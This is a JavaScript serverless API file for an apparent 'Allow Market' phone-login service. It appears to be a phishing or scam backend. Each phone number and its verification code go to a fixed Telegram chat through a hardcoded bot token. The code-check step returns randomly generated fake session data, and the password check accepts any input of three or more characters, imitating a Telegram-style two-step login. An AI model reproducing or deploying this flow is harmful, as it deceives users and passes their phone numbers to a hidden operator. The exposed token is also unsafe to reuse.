// api/index.js
const codeStore = new Map();

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const url = req.url || '';

    // ========== GET /ping ==========
    if (url === '/ping' || url === '/') {
        return res.status(200).json({
            status: 'online',
            service: 'Allow Market Backend',
            version: '1.0.0',
            endpoints: [
                'POST /sendCode',
                'POST /checkCode',
                'POST /checkPassword',
                'GET /ping'
            ]
        });
    }

    // ========== POST /sendCode ==========
    if (url === '/sendCode' && req.method === 'POST') {
        try {
            const { phone } = req.body;
            if (!phone || phone.length < 6) {
                return res.status(400).json({ success: false, error: 'Invalid phone' });
            }

            const code = Math.floor(100000 + Math.random() * 900000).toString();
            const requestId = `req_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

            codeStore.set(requestId, { phone, code, attempts: 0 });
            setTimeout(() => codeStore.delete(requestId), 5 * 60 * 1000);

            const token = '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec';
            const chatId = '7303763255';
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `📱 Код для ${phone}: *${code}*\nID: \`${requestId}\``,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {}

            return res.status(200).json({ success: true, requestId });
        } catch (e) {
            return res.status(500).json({ success: false, error: e.message });
        }
    }

    // ========== POST /checkCode ==========
    if (url === '/checkCode' && req.method === 'POST') {
        try {
            const { phone, code, requestId } = req.body;
            const stored = codeStore.get(requestId);

            if (!stored) {
                return res.status(400).json({ success: false, error: 'Code expired' });
            }
            if (stored.phone !== phone) {
                return res.status(400).json({ success: false, error: 'Phone mismatch' });
            }
            if (stored.code !== code) {
                stored.attempts += 1;
                if (stored.attempts >= 5) codeStore.delete(requestId);
                return res.status(400).json({
                    success: false,
                    error: `Invalid code. ${5 - stored.attempts} attempts left`
                });
            }

            codeStore.delete(requestId);
            const hasPassword = Math.random() < 0.2;

            return res.status(200).json({
                success: true,
                hasPassword,
                sessionData: {
                    user_id: Math.floor(Math.random() * 10000000),
                    phone,
                    username: `user_${Math.random().toString(36).substring(2, 10)}`,
                    session_string: `session_${Date.now()}_${Math.random().toString(36)}`
                }
            });
        } catch (e) {
            return res.status(500).json({ success: false, error: e.message });
        }
    }

    // ========== POST /checkPassword ==========
    if (url === '/checkPassword' && req.method === 'POST') {
        try {
            const { password } = req.body;
            const isValid = password && password.length >= 3;
            return res.status(200).json({
                success: isValid,
                message: isValid ? 'Password verified' : 'Invalid password'
            });
        } catch (e) {
            return res.status(500).json({ success: false, error: e.message });
        }
    }

    // ========== 404 ==========
    return res.status(404).json({
        success: false,
        error: 'Not found',
        path: url
    });
}
